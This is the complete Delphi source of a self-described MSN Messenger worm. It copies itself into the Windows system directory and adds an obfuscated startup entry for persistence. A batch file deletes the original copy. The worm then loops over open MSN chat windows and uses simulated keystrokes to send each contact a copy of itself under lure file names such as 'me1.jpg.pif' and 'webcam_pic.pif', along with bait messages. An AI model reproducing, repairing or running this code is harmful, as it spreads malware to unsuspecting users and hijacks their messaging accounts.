   // !!ignore!!
   (****************************
   *  MSN All Version Worm     *
   *   made by sic, no protocol*
   * works on all versions     *
   *  configured for swe and   *
   * english version of msn    *
   *  PURE OWNAGE I SAY!       *
   * -- lame encryption tho -- *
   ****************************)

   Program Project2;
   uses
     Windows, sendkeys;

   {$R *.res}

   VAR
     Buf,buff : array[0..40000]of char;
     Wins : array[0..300]of record
      Name : string;
      Wnd  : hwnd;
     End;
     Wcnt : integer=0;

   Const
    ABC1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 |';
    ABC2 = 'AcRs7JkZBfbQt6Im0CeTv93GjWyaOr5KEhVx|No2FigUw Mp1HlXz8PLnYudSq4D';

   function decode(s:String):string;
   var
    i:integer;
   begin
    result := '';
    for i:=1 to length(s) do begin
     if pos(copy(s,i,1),abc2)>0 then
      result := result + copy(abc1,pos(copy(s,i,1),abc2),1)
     else result := result + copy(s,i,1);
    end;
   end;

   // !!ignore!!

   function enumwinproc(w:hwnd;lpr:lparam):boolean;stdcall;
   begin

     if iswindowvisible(w) then begin
       getwindowtext(w,buf,10000);
       if buf[0]<>#0 then begin
         wins[wcnt].name:=buf;
         wins[wcnt].wnd:=w;
         wcnt:=wcnt+1;
       end;
     end;
     result:=true;
   end;

   function sendwindows:string;
   var i:integer;
   begin
    result:='';
     wcnt:=0;
     enumwindows(@enumwinproc,0);
     for i:=0 to wcnt-1 do begin
       result:=result+wins[i].name+chr(13);
       wins[i].name := '';
       wins[i].wnd := 0;
     end;
   end;

   function extractfilename(s:string):string;
   var
    str:String;
   begin
     str := s;
     while pos('\', str)>0 do
       str := copy(str, pos('\', str)+1, length(str));
     result := str;
   end;

   Procedure Infect(s:String);
   var
    i:integer;
    dd:hwnd;
    PATH:string;
    a : array[0..255]of char;
   begin
   dd:=GetHandleFromWindowTitle(S);
   MakeWindowActive(dd);
    SetWindowText(DD,pchar('Marijuana Pwns You'));
   getsystemdirectory(a,255);
   path := '';
   Randomize;
   Case Random(26) of
    0 :Path := Path + '\AntiVirus.exe';
    1 :Path := Path + '\Patch.exe';
    2 :Path := Path + '\Nudies.pif';
    3 :Path := Path + '\Kitty.scr';
    4 :Path := Path + '\Leaf.scr';
    5 :Path := Path + '\Marijuana.pif';
    6 :Path := Path + '\Weed.com';
    7 :Path := Path + '\www.marijuana.com';
    8 :Path := Path + '\www.freeweed.com';
    9 :Path := Path + '\leaf.pif';
    10:Path := Path + '\proof that weed doesnt hurt.doc.pif';
    11:Path := Path + '\legalize weed.com';
    12:Path := Path + '\hello.pif';
    13:Path := Path + '\nude.pif';
    14:Path := Path + '\me1.jpg.pif';
    15:Path := Path + '\me1.pif';
    16:Path := Path + '\webcam_pic.pif';
    17:Path := Path + '\Funniest pic on earth.pif';
    18:Path := Path + '\ahahah.pif';
    19:Path := Path + '\coke.pif';
    20:Path := Path + '\hello -_-.pif';
    21:Path := Path + '\msntools.exe';
    22:Path := Path + '\msnplugin.exe';
    23:Path := Path + '\msnP2P.exe';
    24:Path := Path + '\ExtraMSN.exe';
    25:Path := Path + '\MSN-EmotIcons.exe';
   end;
    Copyfile(pchar(paramstr(0)),pchar(Path),false);
   (*
    zip_make(Path, copy(path, 1, length(path)-4)+'.zip', extractfilename(path));
    path := copy(path, 1, length(path)-4)+'.zip';
   *)
    MakeWindowActive(dd);

    Sleep(1000);

    If
    SendKey('{&}F');

    sleep(200);
   for i:=1 to length(path) do begin
    if copy(Path,i,1) = ':' then
     sendkey(decode('{!}.')) else
    if copy(Path,i,1) = '\' then
      sendkey(decode('{^&}?')) else
    SendKey(copy(Path,i,1));

   end;
    Sendkey(#13);
    sleep(200);
    Randomize;
    Case random(8) of
    0:Path := ':)';
    1:Path := '\o/';
    2:Path := 'Wow....';
    3:Path := ';P';
    4:Path := 'WTF ;D';
    5:Path := 'hahaha';
    6:Path := 'LOL!!';
    7:Path := ':)';
    {
    0:Path := 'Hey check this';
    1:Path := 'Hahaha you gotta check this';
    2:Path := 'Wow....';
    3:Path := 'Hey, look at this :D';
    4:Path := 'WTF is this ;D';
    5:Path := 'heres a file for you';
    6:Path := 'hey i want you to have this';
    7:Path := ':)';
    }
    end;

   for i:=1 to length(path) do
    SendKey(copy(Path,i,1));
    Sendkey(#13);
    ShowWindow(dd,0);
    sleep(800);
   end;

   Procedure MSN;
   var
    TMP,Win:string;
   LABEL D;
   begin
   D:
   sleep(400);
   win:='';
   Win := SendWindows;

   while win <> '' do begin

   Tmp := Copy(Win,1 , pos(chr(13),win)-1);
   If pos(decode('4-4OI697CeATBI6'),TMP)>0 then INFECT(TMP);
   If pos(decode('4-4|I697CeATBI6'),TMP)>0 then INFECT(TMP);
   If pos(decode('4-4RI697CeATBI6'),TMP)>0 then INFECT(TMP);
   If pos(decode('4-4bI697CeATBI6'),TMP)>0 then INFECT(TMP);
   Win := Copy(Win,pos(chr(13),win)+1,length(win));
   Sleep(500);
   end;
   goto D;
   end;

   function IntToStr(X: integer): string;
   var
    S: string;
   begin
    Str(X, S);
    Result := S;
   end;

   var
    myname:string;
    mynewname:string;
    sysdir:String;
    na:String;
    bat:textfile;
   begin

    randomize;
    getsystemdirectory(buff,255);
    myname := paramstr(0);
    na := inttostr(random(3))+decode('.cAT');
    sysdir := buff;
    mynewname := '\'+inttostr(random(9))+inttostr(random(9))+inttostr(random(9))+inttostr(random(9))+inttostr(random(9))+inttostr(random(9))+decode('.7G7');
    CopyFile(Pchar(Myname),pchar(sysdir+mynewname),false);
    WRITEPRIVATEPROFILESTRING(pchar(decode('aFF ')),pchar(decode('wh5NN')),PCHAR(decode('5HiNFU5U.5H54')+sysdir+MYNEWNAME),pchar(decode('wlw 5o.V2V')));
    assignfile(bat, sysdir+'\'+na);
    rewrite(bat);
    writeln(bat, decode('s7Q4"')+sysdir+mynewname+'"');
    writeln(bat, decode('s7Q4"')+na+'"');
    closefile(bat);

    msn;
   end.
